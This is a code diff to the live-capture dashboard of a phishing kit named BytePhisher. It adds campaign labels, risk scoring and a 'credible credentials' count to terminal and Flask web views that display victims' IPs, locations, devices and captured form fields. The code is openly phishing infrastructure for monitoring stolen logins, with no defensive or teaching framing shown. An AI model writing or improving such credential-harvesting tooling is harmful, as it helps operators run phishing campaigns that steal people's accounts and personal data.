@@ -10,22 +10,30 @@ def make_frame(caps, stats):
 
     t = Table(title="BytePhisher — Live Captures", title_style="bold magenta", expand=True)
     t.add_column("Time", width=8)
+    t.add_column("Campaign", width=12)
     t.add_column("IP / Geo")
     t.add_column("Device", width=8)
+    t.add_column("Risk", justify="center", width=5)
     t.add_column("Cred", justify="center", width=5)
     t.add_column("Captured Fields", overflow="fold")
     for c in caps:
         ts = datetime.fromtimestamp(c["ts"]).strftime("%H:%M:%S")
         geo = c["city"] or c["country"] or "—"
+        risk = c.get("risk") or 0
+        risk_cell = ("[bold red]high[/]" if risk >= 70 else
+                     "[yellow]med[/]" if risk >= 30 else "[green]low[/]")
         t.add_row(
             ts,
+            c.get("campaign") or "—",
             f'{c["ip"]} ({geo})',
             c["device"],
+            risk_cell,
             "[bold green]✓[/]" if c["is_cred"] else "[dim]·[/]",
             "; ".join(f'{k}={v}' for k, v in list(c["fields"].items())[:4]),
         )
     subtitle = (f'[bold]captures[/] {stats["total_captures"]}  '
                 f'[bold green]creds[/] {stats["credentials"]}  '
+                f'[bold]credible[/] {stats.get("credible_credentials", 0)}  '
                 f'[bold]visitors[/] {stats["visitors"]}')
     return Panel(t, subtitle=subtitle)
 
@@ -58,11 +66,17 @@ def render_plain(caps, stats):
         from datetime import datetime
         ts = datetime.fromtimestamp(c["ts"]).strftime("%H:%M:%S")
         cred = "CRED" if c["is_cred"] else "    "
-        print(f'[{ts}] {c["ip"]:>15} {c["device"]:>8} {cred} {c["city"] or c["country"] or ""}')
+        camp = (c.get("campaign") or "-")[:12]
+        risk = c.get("risk") or 0
+        rl = "HIGH" if risk >= 70 else "med " if risk >= 30 else "low "
+        print(f'[{ts}] {camp:<12} {c["ip"]:>15} {c["device"]:>8} {rl} {cred} {c["city"] or c["country"] or ""}')
         for k, v in c["fields"].items():
-            print(f"         {k} = {v}")
+            print(f'         {k} = {v}')
+        if c.get("risk_reasons"):
+            print(f'         risk: {"; ".join(c["risk_reasons"])}')
     print("-" * 70)
-    print(f'captures={stats["total_captures"]} creds={stats["credentials"]} visitors={stats["visitors"]}')
+    print(f'captures={stats["total_captures"]} creds={stats["credentials"]} '
+          f'credible={stats.get("credible_credentials", 0)} visitors={stats["visitors"]}')
 
 def web_dashboard(port=8090, db=None, host="127.0.0.1"):
     """Optional Flask + WebSocket dashboard for remote monitoring.
@@ -80,8 +94,8 @@ td,th{border-bottom:1px solid #30363d;padding:6px 10px;text-align:left}
 .badge{display:inline-block;padding:2px 8px;border-radius:10px;background:#1f6feb33;color:#58a6ff}
 </style></head><body>
 <h2>BytePhisher — Live Dashboard</h2>
-<table><thead><tr><th>Time</th><th>IP</th><th>Geo</th><th>Device</th><th>Cred</th><th>Fields</th></tr></thead>
-<tbody id="rows"><tr><td colspan="6" style="color:#8b949e">loading…</td></tr></tbody></table>
+<table><thead><tr><th>Time</th><th>Campaign</th><th>IP</th><th>Geo</th><th>Device</th><th>Risk</th><th>Cred</th><th>Fields</th></tr></thead>
+<tbody id="rows"><tr><td colspan="8" style="color:#8b949e">loading…</td></tr></tbody></table>
 <div id="stats" class="badge"></div>
 <script>
 function poll(){
@@ -91,13 +105,17 @@ function poll(){
     tb.innerHTML=caps.map(c=>{
       const t=new Date(c.ts*1000).toLocaleTimeString();
       const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>k+'='+v).join('; ');
-      return `<tr><td>${t}</td><td>${c.ip}</td><td>${c.city||c.country||'—'}</td>
-        <td>${c.device}</td><td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
+      const risk=c.risk||0;
+      const rc=risk>=70?'#f85149':risk>=30?'#d29922':'#3fb950';
+      const rl=risk>=70?'high':risk>=30?'med':'low';
+      return `<tr><td>${t}</td><td>${c.campaign||'—'}</td><td>${c.ip}</td><td>${c.city||c.country||'—'}</td>
+        <td>${c.device}</td><td><span style="color:${rc}">${rl} (${risk})</span></td>
+        <td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
     }).join('');
   });
   fetch('/api/stats').then(r=>r.json()).then(s=>{
     document.getElementById('stats').textContent=
-      `captures ${s.total_captures} | creds ${s.credentials} | visitors ${s.visitors}`;
+      `captures ${s.total_captures} | creds ${s.credentials} | credible ${s.credible_credentials??'-'} | visitors ${s.visitors}`;
   });
   setTimeout(poll, 2000);
 }
@@ -111,11 +129,15 @@ poll();
     @app.route("/api/captures")
     def api_captures():
         limit = int(request.args.get("limit", 20))
-        return jsonify(db.all(limit))
+        campaign = request.args.get("campaign")
+        return jsonify(db.all(limit, campaign=campaign))
 
     @app.route("/api/stats")
     def api_stats():
-        return jsonify(db.stats())
+        campaign = request.args.get("campaign")
+        data = db.stats(campaign=campaign)
+        data["campaigns"] = db.campaigns()
+        return jsonify(data)
 
     th = threading.Thread(target=app.run,
                            kwargs=dict(host=host, port=port, debug=False, use_reloader=False),
